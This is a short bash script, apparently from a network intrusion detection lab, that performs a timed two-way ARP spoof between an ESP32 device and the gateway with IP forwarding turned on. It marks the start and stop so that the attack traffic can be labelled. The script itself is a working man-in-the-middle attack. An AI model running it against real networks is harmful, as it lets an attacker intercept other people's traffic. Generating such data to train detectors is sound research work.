#!/usr/bin/env bash
# Two-way ARP spoof + labeling.
# Usage: sudo ./host/attacks/arpspoof.sh
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

TARGET_IP="$(get_esp32_ip)"
GATEWAY_IP="$(get_gateway_ip)"
DURATION="${NIDS_ARP_DURATION:-15}"

if ip link show "${MON_IFACE}" >/dev/null 2>&1; then
  echo ">>> WARN: ${MON_IFACE} still up. ARP needs managed Wi-Fi."
  echo ">>> Run: sudo ./host/attacks/prepare_wifi.sh managed"
  echo ">>> then join SSID '${SSID}' before re-running."
  exit 1
fi

echo ">>> Target ESP32 IP : $TARGET_IP"
echo ">>> Gateway IP      : $GATEWAY_IP"
echo ">>> Interface       : $WIFI_IFACE"
echo ">>> Enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null

echo ">>> READY FOR ARP SPOOF"
send_label START ARP_SPOOF
sleep 1

arpspoof -i "$WIFI_IFACE" -t "$TARGET_IP" "$GATEWAY_IP" >/dev/null 2>&1 &
pid1=$!
arpspoof -i "$WIFI_IFACE" -t "$GATEWAY_IP" "$TARGET_IP" >/dev/null 2>&1 &
pid2=$!

echo ">>> Spoofing for ${DURATION}s (pids $pid1 $pid2)..."
sleep "$DURATION"

kill "$pid1" "$pid2" 2>/dev/null || true
wait "$pid1" "$pid2" 2>/dev/null || true

sleep 1
send_label STOP ARP_SPOOF
echo " >>> ATTACK FINISHED"
